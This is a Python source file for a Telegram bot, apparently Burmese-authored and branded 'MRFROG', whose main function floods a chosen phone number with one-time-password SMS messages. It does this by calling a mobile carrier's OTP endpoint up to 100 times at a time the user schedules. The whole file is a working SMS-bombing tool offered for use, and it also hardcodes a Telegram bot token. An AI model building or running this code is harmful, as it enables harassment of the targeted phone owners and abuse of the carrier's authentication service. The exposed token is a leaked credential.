import os
import sys
import time
import json
import urllib.request
import urllib.parse
import threading
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer

# ကိုကြီးပေးထားတဲ့ Token အသစ်
TOKEN = "8905904062:AAGICQMVC0UXrATqaWOpq0NEFrGL_1JcDR0"
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"
# Render ကပေးတဲ့ ကိုယ့် URL အသစ်ကို ဒီမှာ ထည့်ပေးပါ
YOUR_URL = "https://mrfrog-sms-bot-v2.onrender.com" 

USER_STATES = {}
PHONE, AMOUNT, TIME_STATE = 1, 2, 3

# ==========================================
# RENDER 24/7 ပိုင်း (Port Server & Ping)
# ==========================================
class RenderServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"MRFROG BOT IS RUNNING!")

def run_port_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), RenderServer)
    server.serve_forever()

def keep_alive():
    while True:
        try:
            urllib.request.urlopen(YOUR_URL)
        except: pass
        time.sleep(60)

# ==========================================
# BOT အလုပ်လုပ်ပုံအပိုင်း
# ==========================================
def send_message(chat_id, text, reply_markup=None):
    url = f"{BASE_URL}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if reply_markup: payload["reply_markup"] = reply_markup
    headers = {"Content-Type": "application/json"}
    req = urllib.request.Request(url, data=json.dumps(payload).encode('utf-8'), headers=headers)
    try:
        urllib.request.urlopen(req)
    except: pass

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = """
======================================================================
     __  __ _____  ______ _____   ____   _____   _____   ____ _______ 
    |  \/  |  __ \|  ____|  __ \ / __ \ / ____|  |  _ \ / __ \__   __|
    | \  / | |__) | |__  | |__) | |  | | |  __   | |_) | |  | | | |   
    | |\/| |  _  /|  __| |  _  /| |  | | | |_ |  |  _ <| |  | | | |   
    | |  | | | \ \| |____| | \ \| |__| | |__| |  | |_) | |__| | | |   
    |_|  |_|_|  \_\______|_|  \_\___/ \_____|  |____/ \____/  |_|   
                                                                      
======================================================================
   Developed by: [ MRFROG ] | (DOH OF CYBER) Bot v1.0
======================================================================
    """
    print(banner)

def flood_sms(phone, amount, chat_id):
    api_url = f"https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={phone}"
    success_count = 0
    for i in range(amount):
        try:
            req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    success_count += 1
                    send_message(chat_id, f"[{i+1}] တစ်ခုရောက်သွားပြီဆိုပေမဲ့ သူမကမင်းဆီပြန်ရောက်မလာခဲ့ဘူး ✅")
                else:
                    send_message(chat_id, f"[{i+1}] မင်းနဲ့သူမလိုပဲလွဲခဲ့ပြီ❌")
        except:
            send_message(chat_id, f"[{i+1}] မင်းနဲ့သူမလိုပဲ လွဲခဲ့ပြီ ❌")
        time.sleep(1)
    return success_count

def scheduled_task(phone, amount, target_time, chat_id):
    send_message(chat_id, f"[⏳] အချိန် {target_time} ကို စောင့်နေပါပြီ...")
    while True:
        if datetime.now().strftime("%H:%M") == target_time:
            break
        time.sleep(30)
    send_message(chat_id, "[🚀] အချိန်ကျပြီ! OTP တွေ ပို့လွှတ်နေပါပြီ...")
    success = flood_sms(phone, amount, chat_id)
    send_message(chat_id, f"[✔] ပြီးပြီ! အောင်မြင်မှု: {success}/{amount}\nနောက်ထပ် /start နှိပ်ပါ။")

def handle_update(update):
    if "message" not in update or "text" not in update["message"]: return
    chat_id = update["message"]["chat"]["id"]
    text = update["message"]["text"].strip()
    
    if text == "/start":
        USER_STATES[chat_id] = {"state": PHONE}
        send_message(chat_id, "မင်္ဂလာပါ! ဖုန်းနံပါတ်ထည့်ပါ:")
        return

    if chat_id not in USER_STATES: return
    state = USER_STATES[chat_id]
    
    if state["state"] == PHONE:
        state["phone"] = text
        state["state"] = AMOUNT
        send_message(chat_id, "ပမာဏ (1-100) ထည့်ပါ:")
    elif state["state"] == AMOUNT:
        state["amount"] = int(text)
        state["state"] = TIME_STATE
        send_message(chat_id, "ပို့ရမယ့်အချိန်ထည့်ပါ (ဥပမာ 12:00):")
    elif state["state"] == TIME_STATE:
        target_time = text
        phone, amount = state["phone"], state["amount"]
        del USER_STATES[chat_id]
        threading.Thread(target=scheduled_task, args=(phone, amount, target_time, chat_id)).start()

def main():
    print_banner()
    threading.Thread(target=run_port_server, daemon=True).start()
    threading.Thread(target=keep_alive, daemon=True).start()
    print("[+] MrFrog SMS Bot is Running...")
    
    offset = None
    while True:
        url = f"{BASE_URL}/getUpdates?timeout=30"
        if offset: url += f"&offset={offset}"
        try:
            req = urllib.request.urlopen(url, timeout=35)
            response = json.loads(req.read().decode())
            if response.get("ok") and response.get("result"):
                for update in response["result"]:
                    handle_update(update)
                    offset = update["update_id"] + 1
        except: time.sleep(2)

if __name__ == '__main__':
    main()
